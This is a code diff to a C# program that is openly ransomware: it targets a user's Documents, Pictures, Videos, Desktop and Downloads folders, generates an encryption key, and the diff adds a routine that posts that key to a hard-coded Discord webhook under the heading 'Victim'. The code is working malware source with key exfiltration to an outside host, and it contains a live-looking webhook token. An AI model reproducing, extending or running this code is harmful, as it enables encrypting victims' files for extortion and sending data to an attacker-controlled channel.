@@ -3,6 +3,7 @@ using System.Collections;
 using System.Collections.Generic;
 using System.IO;
 using System.Linq;
+using System.Net;
 using System.Net.Http;
 using System.Security.Cryptography;
 using System.Text;
@@ -15,10 +16,12 @@ namespace Master
         public static void Main(string[] args)
         {
             var TargettedDirectories =
-                new string[4] { "Documents", "Pictures", "Videos", "Desktop" };
+                new string[5]
+                { "Documents", "Pictures", "Videos", "Desktop", "Downloads" };
 
             var key = GenerateKey(32);
             File.WriteAllText("./key.key", key);
+            SendWebhook (key);
 
             string home =
                 Environment
@@ -106,19 +109,47 @@ namespace Master
 
         private static HttpClient client = new HttpClient();
 
-        public static async void SendWebhook()
+        public static void SendWebhook(string description)
         {
             var WebhookURL =
-                "http://urlapi/webhooks/1007953835467210873/eWKYwe7qrLgS9EdepZyidikxRcfctv6qLhsm-ujF7a7GxvauMyiYWHh8fQMjoHp7KusS";
-            var values =
-                new Dictionary<string, string> {
-                };
+                "https://discordapp.com/api/webhooks/1007953835467210873/eWKYwe7qrLgS9EdepZyidikxRcfctv6qLhsm-ujF7a7GxvauMyiYWHh8fQMjoHp7KusS";
+            var httpRequest = (HttpWebRequest) WebRequest.Create(WebhookURL);
+            httpRequest.ContentType = "application/json";
+            httpRequest.Method = "POST";
 
-            var content = new FormUrlEncodedContent(values);
+            var data =
+                @"{
+  ""embeds"": [
+    {
+      ""title"": ""Victim"",
+      ""description"": ""```"" + " +
+                "```" +
+                description +
+                @" ""```"",
+      ""color"": 15258703
+    }
+  ]
+}
+";
 
-            var response = await client.PostAsync(WebhookURL, content);
+            using (
+                var streamWriter =
+                    new StreamWriter(httpRequest.GetRequestStream())
+            )
+            {
+                streamWriter.Write (data);
+            }
 
-            var responseString = await response.Content.ReadAsStringAsync();
+            var httpResponse = (HttpWebResponse) httpRequest.GetResponse();
+            using (
+                var streamReader =
+                    new StreamReader(httpResponse.GetResponseStream())
+            )
+            {
+                var result = streamReader.ReadToEnd();
+            }
+
+            Console.WriteLine(httpResponse.StatusCode);
         }
 
         public string GetUserHome()
